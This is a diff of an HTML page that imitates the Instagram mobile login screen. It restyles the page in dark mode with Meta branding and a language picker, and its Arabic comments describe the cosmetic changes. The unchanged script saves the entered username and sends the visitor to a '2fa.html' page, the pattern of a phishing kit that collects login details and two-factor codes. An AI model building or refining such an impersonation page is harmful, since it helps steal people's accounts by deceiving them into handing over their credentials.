@@ -6,53 +6,75 @@
     <title>Instagram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 40px; }
         
-        .login-container { width: 100%; max-width: 350px; padding: 0 20px; display: flex; flex-direction: column; align-items: center; }
+        /* الخلفية السودة (دارك مود) */
+        body { background-color: #121212; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; position: relative; }
         
-        /* اللوجو الحقيقي كود Base64 */
-        .logo { margin-bottom: 40px; width: 175px; height: 51px; background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDMuNSAyOS41Ij48cGF0aCBkPSJNMTIuOSAxLjljLS41IDAtMSAuMS0xLjQuMi0uNC4xLS44LjMtMS4xLjYtLjMuMy0uNi42LS44IDEtLjIuNC0uMy44LS4zIDEuM3Y0LjVINy44djMuNGgxLjV2MTAuOGgzLjZWMTIuOWgyLjdWOS41aC0yLjdWNmMwLTEuMS42LTEuNiAxLjYtMS42aDEuMlYxLjloLTIuOHpNMjMgOS4xYy0zLjcgMC02LjEgMi42LTYuMSA2LjcgMCA0LjIgMi40IDYuOCA2LjIgNi44IDMuNyAwIDYuMS0yLjYgNi4xLTYuOCAwLTQuMS0yLjQtNi43LTYuMi02Ljd6bTAgMTAuN2MtMS44IDAtMi42LTEuNC0yLjYtNCAwLTIuNS44LTMuOSAyLjYtMy45IDEuOCAwIDIuNiAxLjQgMi42IDMuOSAwIDIuNi0uOCA0LTIuNiA0ek0zOS40IDkuNWgtMy42djEyLjhoMy42VjkuNXpNMzcuNiAzYy0xLjIgMC0yIC44LTIgMnMuOCAyIDIgMiAyLS44IDItMi0uOC0yLTItMnoiLz48cGF0aCBkPSJNNTEuOCA5LjJjLTEuNyAwLTIuOC45LTMuNCAxLjdWOS41aC0zLjZ2MTIuOGgzLjZ2LTYuN2MwLTEuOCAxLTIuOCAyLjQtMi44IDEuMyAwIDIgLjggMiAyLjN2Ny4yaDMuNnYtNy42YzAtMy4yLTEuNi01LjUtNC42LTUuNXpNNjkuMSA5LjJjLTMuMSAwLTUuMyAyLTUuMyA1LjR2Mi44YzAgMy40IDIuMiA1LjQgNS40IDUuNCAyLjQgMCA0LjItMS4yIDQuOC0zLjRsLTMuMy0xLjFjLS4zIDEtMSAxLjYtMS45IDEuNi0xLjIgMC0xLjktLjgtMi0yLjNoNy4zdi0yLjZjMC0zLjYtMi01LjgtNS01Ljh6bS0yLjMgNS4yYy4xLTEuNS45LTIuMyAyLjEtMi4zIDEuMSAwIDEuOC44IDEuOCAyLjNoLTMuOXpNODMuOCAxM2MtMS42LS40LTItLjgtMi0xLjUgMC0uOC43LTEuMyAxLjgtMS4zIDEuMSAwIDIgLjUgMi4zIDEuNGwzLjItMS4zYy0uOS0yLTIuOS0zLjEtNS41LTMuMS0zIDAtNS4xIDEuNy01LjEgNC40IDAgMi41IDEuNCAzLjcgNC40IDQuMyAxLjcuNCAyLjEuOCAyLjEgMS42IDAgLjktLjggMS40LTIuMSAxLjQtMS41IDAtMi41LS42LTIuOS0xLjhsLTMuMiAxLjNjLjggMi4zIDIuOSAzLjYgNi4xIDMuNiAzLjMgMCA1LjUtMS43IDUuNS00LjYgMC0yLjYtMS40LTMuOC00LjYtNC40ek0xMDAgOS41aC0zLjZ2MTIuOGgzLjZWOS41ek05OC4yIDNjLTEuMiAwLTIgLjgtMiAycy44IDIgMiAyIDItLjggMi0yLS44LTItMi0yeiIvPjwvc3ZnPg=='); background-size: contain; background-repeat: no-repeat; background-position: center; }
+        /* زر الرجوع */
+        .back-btn { position: absolute; top: 20px; left: 20px; width: 40px; height: 40px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .back-btn svg { width: 20px; height: 20px; fill: #fff; }
         
-        form { width: 100%; display: flex; flex-direction: column; gap: 6px; }
+        /* اختيار اللغة */
+        .lang-selector { margin-top: 25px; color: #b0b0b0; font-size: 14px; display: flex; align-items: center; gap: 5px; cursor: pointer; }
+        .lang-selector svg { width: 12px; fill: #b0b0b0; }
+        
+        .login-container { width: 100%; max-width: 350px; padding: 0 20px; display: flex; flex-direction: column; align-items: center; margin-top: 60px; }
+        
+        /* اللوجو الملوّن */
+        .logo { margin-bottom: 50px; width: 80px; height: 80px; }
+        
+        form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
         
         .input-group { position: relative; width: 100%; }
-        .input-group input { width: 100%; padding: 14px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; color: #262626; outline: none; }
-        .input-group input:focus { border: 1px solid #a8a8a8; }
+        .input-group input { width: 100%; padding: 16px 14px; background-color: transparent; border: 1px solid #363636; border-radius: 14px; font-size: 14px; color: #fff; outline: none; transition: 0.2s; }
+        .input-group input:focus { border: 1px solid #555; }
+        .input-group input::placeholder { color: #888; }
         
-        .show-password { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 14px; font-weight: 600; color: #262626; cursor: pointer; background: none; border: none; display: none; }
+        .show-password { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); font-size: 14px; font-weight: 600; color: #fff; cursor: pointer; background: none; border: none; display: none; }
         
-        .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 8px; padding: 8px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; transition: 0.2s; }
-        .login-btn:disabled { background-color: #b2dffc; cursor: default; }
+        /* زر تسجيل الدخول */
+        .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 14px; padding: 14px 16px; font-weight: 600; font-size: 16px; margin-top: 5px; cursor: pointer; transition: 0.2s; }
+        .login-btn:disabled { background-color: #1a4e7a; cursor: default; color: #888; }
         
-        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 20px; text-align: center; display: block; font-weight: 500; }
+        .forgot-password { color: #fff; font-size: 14px; text-decoration: none; margin-top: 20px; text-align: center; display: block; font-weight: 500; }
         
-        .divider { display: flex; align-items: center; width: 100%; margin: 20px 0; }
-        .line { flex-grow: 1; height: 1px; background-color: #dbdbdb; }
-        .or-text { margin: 0 18px; font-size: 13px; font-weight: 600; color: #8e8e8e; }
+        /* زر إنشاء حساب */
+        .create-account-btn { width: 100%; background-color: transparent; border: 1px solid #0095f6; color: #0095f6; border-radius: 14px; padding: 14px 16px; font-weight: 600; font-size: 16px; margin-top: 80px; cursor: pointer; transition: 0.2s; }
         
-        .fb-login-btn { width: 100%; background-color: transparent; border: none; padding: 7px 16px; font-weight: 600; font-size: 14px; color: #385185; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; }
-        .fb-icon { width: 18px; height: 18px; fill: #385185; }
-        
-        .signup-box { margin-top: 30px; text-align: center; font-size: 14px; color: #262626; border-top: 1px solid #dbdbdb; width: 100%; padding-top: 20px;}
-        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
-        
-        .get-app { text-align: center; width: 100%; margin-top: 40px; }
-        .get-app p { font-size: 14px; color: #262626; margin-bottom: 15px; }
-        .app-badges { display: flex; justify-content: center; gap: 10px; }
-        .app-badges img { height: 40px; cursor: pointer; }
-        
-        .footer { margin-top: 40px; margin-bottom: 30px; display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 15px; font-size: 12px; color: #8e8e8e; padding: 0 20px; text-align: center; }
-        .footer a { color: #8e8e8e; text-decoration: none; }
+        /* Meta Logo */
+        .meta-footer { margin-top: 30px; display: flex; justify-content: center; align-items: center; gap: 5px; color: #b0b0b0; font-size: 16px; font-weight: 500; margin-bottom: 30px;}
+        .meta-footer svg { width: 20px; height: 20px; fill: #b0b0b0; }
+
+        /* نافذة اللغات */
+        .lang-modal { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: #262626; border-radius: 20px 20px 0 0; padding: 20px; z-index: 1000; max-height: 80vh; overflow-y: auto; flex-direction: column;}
+        .lang-modal.open { display: flex; }
+        .lang-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .close-lang { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
+        .lang-list { list-style: none; display: flex; flex-direction: column; gap: 15px; padding-bottom: 20px;}
+        .lang-item { display: flex; justify-content: space-between; font-size: 16px; color: #fff; padding: 5px 0; cursor: pointer;}
+        .lang-item input[type="checkbox"] { width: 20px; height: 20px; accent-color: #0095f6; }
     </style>
 </head>
 <body>
+
+    <!-- زر الرجوع -->
+    <div class="back-btn">
+        <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+    </div>
+
+    <!-- اختيار اللغة -->
+    <div class="lang-selector" onclick="toggleLangModal()">
+        <span>English (US)</span>
+        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+
     <div class="login-container">
-        <!-- الشعار هنا بقى كود مش صورة -->
-        <div class="logo"></div>
+        <!-- اللوجو الملوّن (Base64) -->
+        <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNzUgMTc1Ij48ZGVmcz48bGluZWFyR3JhZGllbnQgaWQ9ImciIHgxPSIwJSIgeTE9IjAlIiB4Mj0iMTAwJSIgeTI9IjEwMCUiPjxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNmZmQ2MDAiLz48c3RvcCBvZmZzZXQ9IjUwJSIgc3RvcC1jb2xvcj0iI2ZmMDAwMCIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI2QzMDBjNSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxwYXRoIGZpbGw9InVybCgjZykiIGQ9Ik0xMjIgNTJ2MjBIMzB2MjBoMjB2MjBINzB2MjBoMjB2LTIwSDEyMFY4MmgxNlY2MmgxNlY0MmgxNnYyMHptLTIgNjBIMzB2MjBoNjB2LTIweiIvPjwvc3ZnPg==" alt="Instagram">
         
         <form id="loginForm">
             <div class="input-group">
-                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="text" id="username" placeholder="Username, email or mobile number" required>
             </div>
             <div class="input-group">
                 <input type="password" id="password" placeholder="Password" required>
@@ -63,32 +85,33 @@
         
         <a href="#" class="forgot-password">Forgot password?</a>
         
-        <div class="divider">
-            <div class="line"></div>
-            <div class="or-text">OR</div>
-            <div class="line"></div>
-        </div>
+        <!-- زر إنشاء حساب جديد -->
+        <button class="create-account-btn">Create new account</button>
         
-        <button class="fb-login-btn">
-            <svg class="fb-icon" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-            Log in with Facebook
-        </button>
-        
-        <div class="signup-box">
-            Don't have an account? <a href="#">Sign up</a>
+        <!-- Meta Footer -->
+        <div class="meta-footer">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+            Meta
         </div>
-        
-        <div class="get-app">
-            <p>Get the app.</p>
-            <div class="app-badges">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f7/Get_it_from_Microsoft_Badge.svg" alt="Get it from Microsoft">
-            </div>
+    </div>
+
+    <!-- نافذة اللغات -->
+    <div class="lang-modal" id="langModal">
+        <div class="lang-header">
+            <button class="close-lang" onclick="toggleLangModal()">✕</button>
         </div>
-        
-        <div class="footer">
-            <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> <a href="#">Meta Verified</a>
-        </div>
+        <ul class="lang-list">
+            <li class="lang-item"><span>English (US)</span> <input type="checkbox" checked></li>
+            <li class="lang-item"><span>Afrikaans</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>Bahasa Indonesia</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>Bahasa Melayu</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>Dansk</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>Deutsch</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>English (UK)</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>Español</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>Español (España)</span> <input type="checkbox"></li>
+            <li class="lang-item"><span>Filipino</span> <input type="checkbox"></li>
+        </ul>
     </div>
 
     <script>
@@ -135,6 +158,10 @@
             sessionStorage.setItem('insta_user', username);
             window.location.href = '2fa.html';
         });
+
+        function toggleLangModal() {
+            document.getElementById('langModal').classList.toggle('open');
+        }
     </script>
 </body>
 </html>
